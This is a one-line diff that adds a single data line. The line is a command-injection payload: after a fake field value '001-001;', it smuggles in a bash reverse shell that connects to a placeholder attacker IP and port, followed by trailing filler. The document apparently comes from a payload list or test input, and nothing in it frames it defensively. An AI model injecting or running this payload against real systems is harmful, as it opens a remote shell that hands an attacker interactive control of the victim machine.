@@ -1,0 +1,1 @@
+001-001;bash -c "bash -i >& /dev/tcp/<YOURSERVERIPADDRESS>/<YOURSERVERPORT> 0>&1";#|x|x|x
